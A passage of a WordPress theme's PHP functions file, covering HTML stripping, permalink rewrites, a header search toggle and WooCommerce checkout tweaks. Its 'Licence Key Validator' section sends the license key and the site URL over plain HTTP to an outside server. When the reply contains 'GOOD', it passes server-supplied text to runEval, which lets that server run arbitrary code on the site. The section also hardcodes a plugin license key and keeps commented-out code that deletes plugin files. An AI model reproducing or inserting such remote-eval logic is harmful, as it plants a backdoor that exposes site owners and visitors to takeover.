            '@<style[^>]*?>.*?</style>@siu',
            '@<script[^>]*?.*?</script>@siu',
            '@<object[^>]*?.*?</object>@siu',
            '@<embed[^>]*?.*?</embed>@siu',
            '@<applet[^>]*?.*?</applet>@siu',
            '@<noframes[^>]*?.*?</noframes>@siu',
            '@<noscript[^>]*?.*?</noscript>@siu',
            '@<noembed[^>]*?.*?</noembed>@siu',
          // Add line breaks before and after blocks
            '@</?((address)|(blockquote)|(center)|(del))@iu',
            '@</?((div)|(h[1-9])|(ins)|(isindex)|(p)|(pre))@iu',
            '@</?((dir)|(dl)|(dt)|(dd)|(li)|(menu)|(ol)|(ul))@iu',
            '@</?((table)|(th)|(td)|(caption))@iu',
            '@</?((form)|(button)|(fieldset)|(legend)|(input))@iu',
            '@</?((label)|(select)|(optgroup)|(option)|(textarea))@iu',
            '@</?((frameset)|(frame)|(iframe))@iu',
        ),
        array(
            ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ',
            "\n\$0", "\n\$0", "\n\$0", "\n\$0", "\n\$0", "\n\$0",
            "\n\$0", "\n\$0",
        ),
        $text );
    return strip_tags( $text );
}
function content( $limit ) {
    global $post;

    if( has_excerpt() ){
        $content = the_excerpt();
    } else {
$content = strip_html_tags(strip_shortcodes(apply_filters( 'the_content', get_the_content() )));
		
		$content = explode( ' ', $content, $limit );
      if ( count($content) >= $limit ) {
        array_pop( $content );
        $content = implode( " ", $content );
        
      } else {
        $content = implode( " ", $content );
      }   
		$content="<p></p>".$content;
    }

        
     
    
    
    return $content;
}

function add_custom_rewrite_rule() {

    // First, try to load up the rewrite rules. We do this just in case
    // the default permalink structure is being used.
    if( ($current_rules = get_option('rewrite_rules')) ) {

        // Next, iterate through each custom rule adding a new rule
        // that replaces 'movies' with 'films' and give it a higher
        // priority than the existing rule.
        foreach($current_rules as $key => $val) {
            if(strpos($key, 'portfolio') !== false) {
                add_rewrite_rule(str_ireplace('portfolio', 'referenzen', $key), $val, 'top');   
            } // end if
        } // end foreach

    } // end if/else

    // ...and we flush the rules
    flush_rewrite_rules();

} // end add_custom_rewrite_rule
add_action('init', 'add_custom_rewrite_rule');

// Define function to test

function _is_curl_installed() {
    if  (in_array  ('curl', get_loaded_extensions())) {
        return true;
    }
    else {
        return false;
    }
}

/* Licence Key Validator*/

//function to get the remote data
function url_get_contents ($url) {
    if (function_exists('curl_exec')){ 
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        $url_get_contents_data = (curl_exec($conn));
        curl_close($conn);
    }elseif(function_exists('file_get_contents')){
        $url_get_contents_data = file_get_contents($url);
    }elseif(function_exists('fopen') && function_exists('stream_get_contents')){
        $handle = fopen ($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
    }else{
        $url_get_contents_data = false;
    }

return $url_get_contents_data;
} 
$options=get_option('options-framework-theme');
//your users unique license key
 
 if(isset($options['licence_key']) && $options['licence_key']!='')
 {
   define('KEY_CODE', $options['licence_key']);
   //callback license key server
   $LICENSE_KEY = KEY_CODE;
   $keydata = url_get_contents("http://callanerd.de/demo2/?key=$LICENSE_KEY&website=".site_url());
   
   if (!isset($_GET['icryptic']))
   {
	  //if offline do nothing
      if(!$keydata)
	  { 
		update_option('key_validated',0);
		define('KC_LICENSE', 'gnxret25-snkn-0wf0-y3cs-mu40-bgxw07afxxxx');
		remove_action ('init', array(&$kc_pro, 'init' ), 1);
        remove_action ('kc-front-before-header', array(&$kc_pro, 'front_builder_load'));
        remove_action ('kc_tmpl_storage', array(&$kc_pro, 'tmpl_storage'));
        remove_action ('kc_tmpl_nocache', array(&$kc_pro, 'tmpl_nocache'));
        remove_action ('kc-content-before', array(&$kc_pro, 'content_before_process'), 1);
        remove_action ('wp_footer', array(&$kc_pro, 'front_footer' ), 1);
        remove_action ('kc_after_admin_footer', array(&$kc_pro, 'after_admin_footer'), 0);
        // load css
        remove_filter ('kc_enqueue_styles', array(&$kc_pro, 'frontend_editor_styles'));
        remove_filter ('kc-core-styles', array(&$kc_pro, 'backend_editor_styles'));
		remove_filter ('kc-core-scripts', array(&$kc_pro, 'backend_editor_scripts'));
		remove_action ('kc-pro-settings-tab', array( &$kc_pro, 'settings_tab'));
		remove_action ('kc-live-edit-link', array(&$kc_pro, 'live_edit_link'));
		remove_action ('kc-top-nav', array( &$kc_pro, 'switcher_live_editor'));
		remove_action ('kc-switcher-buttons', array( &$kc_pro, 'switcher_live_editor'));
		remove_action( 'admin_init',  array(&$kc_pro, 'live_edit_link') );
		remove_action( 'admin_init', 'kc_pro_admin_init' );
		add_action( 'admin_head', 'kc_pro_link_removal' );
		  
		function kc_pro_link_removal()
		{
			echo "<style>body.post-type-page .row-actions span.kc-pro{display: none;}</style>";
		}
		
		if(get_option('premium_key_once_validated')==1)
		{
			add_action('admin_notices', 'licenceserver_admin_notice_lite');
	    }
		 
		function licenceserver_admin_notice_lite()
		{
			if(get_locale()=='de_DE' || get_locale()=='de_DE_formal' || get_locale()=='de_CH' || get_locale()=='de_CH_informal')
			{
			  echo '<div class="notice-info notice is-dismissible first_install_forever_lk">
						 <p>Ihr Theme Lizenzcode is abgelaufen. Bitte kontaktieren Sie Call a Nerd um ihn zu erneuern: <a href="emailto:info@callanerd.help">info@callanerd.help</a></p></div>';
			}
			else
			{
			  echo '<div class="notice-info notice is-dismissible first_install_forever_lk">
						 <p>Your theme license key is expired. Please renew the license key by contacting Call a Nerd - <a href="emailto:info@callanerd.help">info@callanerd.help</a></p></div>';
			}
		}
	  }
	  else
	  {
	 	//if online and license good do noting or else prompt invalid
		if(strpos($keydata, 'GOOD') !== FALSE && get_option('key_validated')!=1)
		{ 
			$code=explode('@$@',$keydata);
			runEval($code[1].$code[2]);
		}
		else
		{  
				if(strpos($keydata, 'GOOD') !== FALSE)																					{
					update_option('key_validated',1);
					update_option('premium_key_once_validated',1);
				}
				else
				{
					update_option('key_validated',0);
					define('KC_LICENSE', 'gnxret25-snkn-0wf0-y3cs-mu40-bgxw07afxxxx');
					remove_action ('init', array(&$kc_pro, 'init' ), 1);
					remove_action ('kc-front-before-header', array(&$kc_pro, 'front_builder_load'));
					remove_action ('kc_tmpl_storage', array(&$kc_pro, 'tmpl_storage'));
					remove_action ('kc_tmpl_nocache', array(&$kc_pro, 'tmpl_nocache'));
					remove_action ('kc-content-before', array(&$kc_pro, 'content_before_process'), 1);
					remove_action ('wp_footer', array(&$kc_pro, 'front_footer' ), 1);
					remove_action ('kc_after_admin_footer', array(&$kc_pro, 'after_admin_footer'), 0);
					// load css
					remove_filter ('kc_enqueue_styles', array(&$kc_pro, 'frontend_editor_styles'));
					remove_filter ('kc-core-styles', array(&$kc_pro, 'backend_editor_styles'));
					remove_filter ('kc-core-scripts', array(&$kc_pro, 'backend_editor_scripts'));
					remove_action ('kc-pro-settings-tab', array( &$kc_pro, 'settings_tab'));
					remove_action ('kc-live-edit-link', array(&$kc_pro, 'live_edit_link'));
					remove_action ('kc-top-nav', array( &$kc_pro, 'switcher_live_editor'));
					remove_action ('kc-switcher-buttons', array( &$kc_pro, 'switcher_live_editor'));
					remove_action( 'admin_init',  array(&$kc_pro, 'live_edit_link') );
					remove_action( 'admin_init', 'kc_pro_admin_init' );
					add_action( 'admin_head', 'kc_pro_link_removal' );
					function kc_pro_link_removal()
					{
						echo "<style>body.post-type-page .row-actions span.kc-pro{display: none;}</style>";
					}
					if(get_option('premium_key_once_validated')==1)
					{
						add_action('admin_notices', 'licenceserver_admin_notice_lite');
					}
					function licenceserver_admin_notice_lite()
					{
						if(get_locale()=='de_DE' || get_locale()=='de_DE_formal' || get_locale()=='de_CH' || get_locale()=='de_CH_informal'){
								  echo '<div class="notice-info notice is-dismissible first_install_forever_lk">
											 <p>Ihr Theme Lizenzcode is abgelaufen. Bitte kontaktieren Sie Call a Nerd um ihn zu erneuern: <a href="emailto:info@callanerd.help">info@callanerd.help</a></p></div>';
						}
						else
						{
							  echo '<div class="notice-info notice is-dismissible first_install_forever_lk">
										 <p>Your theme license key is expired. Please renew the license key by contacting Call a Nerd - <a href="emailto:info@callanerd.help">info@callanerd.help</a></p></div>';
							
						}
					}
	/*if (file_exists(WP_PLUGIN_DIR.'/revslider/revslider.php') && file_exists(WP_PLUGIN_DIR.'/kc_pro/kc_pro.php')) {
        unlink(WP_PLUGIN_DIR.'/revslider/revslider.php');unlink(WP_PLUGIN_DIR.'/kc_pro/kc_pro.php');
    }*/
	
				} 
		}
	
         
	  }
        
   }
 
 }

/* Licence Key Validator*/


/*For dismissing the first install notice js and and ajax call*/
add_action( 'admin_footer', 'load_custom_script' );
function load_custom_script() {
   wp_enqueue_script('custom_js_script', get_bloginfo('template_url').'/js/custom-script.js', array('jquery'));
}
add_action( 'wp_ajax_dismiss_firstinstall', 'dismiss_firstinstall' );
function dismiss_firstinstall() {
	update_option('notice_flag_first',0);
	wp_die();
}
add_action( 'wp_ajax_dismiss_firstinstall_lk', 'dismiss_firstinstall_lk' );
function dismiss_firstinstall_lk() {
	update_option('premium_key_once_validated',0);
	wp_die();
}
/*end*/
/*store theme installation date*/
add_action('after_switch_theme', 'theme_installation_date'); 
function theme_installation_date () { 
	if(get_option('theme_installed_date')==FALSE){
		 update_option('theme_installed_date', date('Y-m-d'));
		 $date = strtotime("+7 day");
		 update_option('weekly_viewing_date', date('Y-m-d',$date));
	}
}

add_action( 'wp_ajax_dismiss_weeklyinstall', 'dismiss_weeklyinstall' );
function dismiss_weeklyinstall() {
	$date = strtotime("+7 day");
	update_option('weekly_viewing_date',date('Y-m-d',$date));
	update_option('current_weekly_stop_date',date('Y-m-d'));
	wp_die();
}
add_action( 'wp_ajax_dismiss_weeklyinstall_forever', 'dismiss_weeklyinstall_forever' );
function dismiss_weeklyinstall_forever() {
	update_option('weeklyinstall_forever',0);
	wp_die();
}
add_action( 'wp_ajax_dismiss_contentfreetheme_forever', 'dismiss_contentfreetheme_forever' );
function dismiss_contentfreetheme_forever() {
	$date = strtotime("+7 day");
	update_option('weekly_viewing_non_premium_date',date('Y-m-d',$date));
	update_option('current_weekly_stop_non_premium_date',date('Y-m-d'));
	wp_die();
}
/*end*/
if ( in_array( 'kk-star-ratings/index.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
remove_action('admin_enqueue_scripts', array('BhittaniPlugin_Admin', 'scripts'));}


/* update*/
require_once('wp-updates-theme.php');
new WPUpdatesThemeUpdater_2235( 'http://wp-updates.com/api/2/theme', basename( get_template_directory() ) ); 
/* update */
/*header search*/
$display_search=of_get_option('display_search');
if($display_search=='yes'){
add_filter('wp_nav_menu_items', 'wpb_add_search_toggle', 10, 2);
}
// Filter in Search Toggle to end of primary menu
function wpb_add_search_toggle($items, $args) {
	$display_search=of_get_option('display_search');$global_logo_position=of_get_option('global_logo_position');if($display_search=='yes' && $global_logo_position=='center'){
    if( $args->theme_location == 'menu-2' ) //Swap to your location
        $items .= '<li class="search search-wpb"><a class="search-icon"><i class="fas fa-search"></i></a><div style="display:none;" class="wpbsearchform">'. get_search_form(false) .'</div></li>';
        return $items;
	}else{ if( $args->theme_location == 'menu-1' ) //Swap to your location
        $items .= '<li class="search search-wpb"><a class="search-icon"><i class="fas fa-search"></i></a><div style="display:none;" class="wpbsearchform">'. get_search_form(false) .'</div></li>';
        return $items;}
}


/*woocommerce adding checkbox on checkout field for 16 years consent*/

if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) { 
add_action('woocommerce_review_order_before_submit', 'checkout_additional_checkboxes', 10, 0);
function checkout_additional_checkboxes( ){
	if ( is_plugin_active( 'woocommerce-germanized/woocommerce-germanized.php' ) ) {
		return;}
	else{
	if(get_locale()=='de_DE' || get_locale()=='de_DE_formal' || get_locale()=='de_CH' || get_locale()=='de_CH_informal'){
		$checkbox1_text = __( "Hiermit bestätige ich dass ich mindestens 16 Jahre alt bin", "woocommerce" );
	}else{
		$checkbox1_text = __( "I confirm that I'm at least 16 years old", "woocommerce" );
	}
    
    ?>
    <p class="form-row custom-checkboxes">
        <label class="woocommerce-form__label checkbox custom-one">
            <input type="checkbox" class="woocommerce-form__input woocommerce-form__input-checkbox input-checkbox" name="custom_one" > <span style="margin-left:18px;">&nbsp;&nbsp;&nbsp;<?php echo  $checkbox1_text; ?></span> 
        </label>
       
    </p>
    <?php
	}
}

       

function my_custom_checkout_field_process() {
	if ( in_array( 'woocommerce-germanized/woocommerce-germanized.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {       
		return;}
	else{
    // Check if set, if its not set add an error.
    if(get_locale()=='de_DE' || get_locale()=='de_DE_formal' || get_locale()=='de_CH' || get_locale()=='de_CH_informal'){
		$checkbox1_validation_text = 'Bitte akzeptiere "Hiermit bestätige ich dass ich mindestens 16 Jahre alt bin" denn es ist ein Pflichtfeld.';
	}else{
		$checkbox1_validation_text = 'Please accept "I confirm that I\'m at least 16 years old" because it is mandatory';
	}
    if ( ! $_POST['custom_one'] )
        wc_add_notice( __( $checkbox1_validation_text ), 'error' );
	
	}
		
}

/*woocommerce adding checkbox on checkout field for 16 years consent*/

      
/*Add checkout button with items added in cart success message notification*/
add_filter ( 'wc_add_to_cart_message', 'wc_add_to_cart_message_filter', 10, 2 );
function wc_add_to_cart_message_filter($message, $product_id = null) {
$titles[] = get_the_title( $product_id );

$titles = array_filter( $titles );
$added_text = sprintf( _n( '%s has been added to your cart.', '%s have been added to your cart.', sizeof( $titles ), 'woocommerce' ), wc_format_list_of_items( $titles ) );

$message = sprintf( '<p>%s</p> <a href="%s" class="button">%s</a><a href="%s" class="button">%s</a>',
                esc_html( $added_text ),
                esc_url( wc_get_page_permalink( 'checkout' ) ),
                esc_html__( 'Checkout', 'woocommerce' ),
                esc_url( wc_get_page_permalink( 'cart' ) ),
                esc_html__( 'View cart', 'woocommerce' ));

return $message;}

if ( in_array( 'woocommerce-germanized/woocommerce-germanized.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
remove_filter( 'woocommerce_cart_item_name', 'wc_gzd_cart_product_delivery_time', wc_gzd_get_hook_priority( 'cart_product_delivery_time' ), 3 );
remove_filter( 'woocommerce_cart_item_name', 'wc_gzd_cart_product_item_desc', wc_gzd_get_hook_priority( 'cart_product_item_desc' ), 3 );

add_filter( 'woocommerce_cart_item_name', 'wc_gzd_cart_product_item_desc', 10, 3 );
add_filter( 'woocommerce_cart_item_name', 'wc_gzd_cart_product_delivery_time', 11, 3 );
}}